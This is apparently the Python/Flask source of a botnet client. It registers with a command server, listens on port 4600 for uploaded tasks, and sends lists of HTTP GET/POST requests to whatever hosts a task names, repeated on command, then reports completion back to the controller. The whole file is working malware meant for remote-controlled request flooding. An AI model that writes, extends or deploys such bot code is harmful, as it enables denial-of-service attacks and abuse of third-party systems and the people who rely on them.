from flask import Flask
from flask import request
import json
import requests
import threading
import time
import signal
import sys

app = Flask(__name__)
lock = threading.Lock()

PORT = "4600"
SERVER_IP = "localhost:80"
VERSION = "0.0.1"
ID = ""
CONNECTED = False

####################################
# Performing Tasks
####################################
class HTTPRequestStruct:
    def __init__(self, method, host, path, headers, body):
        self.method = method
        self.host = host
        self.path = path
        self.headers = headers
        self.body = body
    def do_request(self):
        if self.method == "GET":
            if self.path[0] != "/":
                r = requests.get(self.host + "/" + self.path, headers=self.headers)
                return r.status_code, r.headers, r.text
            else:
                r = requests.get(self.host + self.path, headers=self.headers)
                print(r.text)
                return r.status_code, r.headers, r.text
        elif self.method == "POST":
            if self.path[0] != "/":
                r = requests.post(self.host + "/" + self.path, data=self.body, headers=self.headers)
                return r.status_code, r.headers, r.text
            else:
                r = requests.post(self.host + self.path, data=self.body, headers=self.headers)
                return r.status_code, r.headers, r.text

class Task:
    def __init__(self, raw_task):
        # This is the raw JSON for a task
        self.raw_task = raw_task

        # Initialize http requests
        self.http_requests = []

        # Create list of tuples for responses containing
        # the status code and the actual request body
        self.result = []

        #This is the ID for the task
        self.id = 0

        # This indicates how many times we do the task
        self.times = 1

        # Parse the json
        tasks_loaded = json.loads(self.raw_task)
        for request in tasks_loaded:
            method = request["Method"]
            host = request["Host"]
            path = request["Path"]
            headers = request["Headers"]
            body = request["Body"]
            http_request_deserialized = HTTPRequestStruct(method, host, path, headers, body)
            self.http_requests.append(http_request_deserialized)
    def do_task(self):
        for x in range(self.times):
            for request in self.http_requests:
                request.do_request()
            global ID
            requests.post("http://" + SERVER_IP + "/done", data={"Type":"DONE", "ID": ID, 
                "Message":str(self.id), "MessageBinary":"", "Version":VERSION})

class TaskManager(Task):
    def __init__(self):
        self.tasks = []
    def push_task(self, Task):
        lock.acquire()
        self.tasks.append(Task)
        lock.release()
    def do_tasks(self):
        while True:
            for x in range(len(self.tasks)):
                self.tasks[x].do_task() # @BUG: concurrency issue here probably
                lock.acquire()
                del self.tasks[x]
                lock.release()
            time.sleep(0.1)

task_manager = TaskManager()

def task_subroutine():
    t_id = threading.Thread(target=task_manager.do_tasks, args=[])
    t_id.start()

####################################
# Server (on port PORT)
####################################
@app.route("/", methods=["GET", "POST"])
def Index():
    return "Hello, world!"

@app.route("/uploadtask", methods=["GET", "POST"])
def UploadTask():
    if request.method == "POST":
        print("incoming task!")
        # Parse the request
        r_Type = request.form["Type"]
        r_ID = request.form["ID"]
        r_Message = request.form["Message"]
        r_MessageBinary = request.form["MessageBinary"]
        r_Version = request.form["Version"]

        # Deserialize the task from the message
        task = Task(r_Message)
        task_manager.push_task(task)

        # return okay so we can be done with the connection
        return "Okay"

@app.route("/ping", methods=["GET", "POST"])
def Ping():
    global ID
    response = {
        "Type": "PONG",
        "ID":ID,
        "Message":"",
        "MessageBinary":"",
        "Version":VERSION,
    }
    response_json = json.dumps(response)
    return response_json

############################################
# Functions to interact with botnet server
############################################
def join_botnet():
    response = requests.post("http://" + SERVER_IP + "/join", data={
        "Type":"JOIN",
        "ID":"",
        "Message":"",
        "MessageBinary":"",
        "Version":VERSION,
    })
    response_parsed = json.loads(response.text)
    resp_message = response_parsed["Message"]
    resp_type = response_parsed["Type"]
    if resp_type == "UPDATE":
        # @TODO: make it so that it updates if it is the wrong version
        pass
    else:
        print("[*] Successfully joined botnet!")
        global ID
        ID = resp_message
        print("\tID: {}".format(ID))
        return True
    return False

def auto_join_botnet_subroutine():
    joined = False
    while True:
        joined = join_botnet()
        global CONNECTED
        CONNECTED = joined
        if CONNECTED == True:
            break

def disconnect():
    global ID
    response = requests.post("http://" + SERVER_IP + "/disconnect", data={
        "Type":"DISCONNECT",
        "ID":ID,
        "Message":"I gtg bud",
        "MessageBinary":"",
        "Version":VERSION,
    })

##################################
# Some utility functions
##################################
def sigint_handler(sig, frame):
    print("[*] Intercepted sigint!")
    print("\tGracefully quitting!")
    disconnect()
    quit()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, sigint_handler)
    auto_join_botnet_subroutine()
    task_subroutine()
    app.run(debug=False, port=PORT)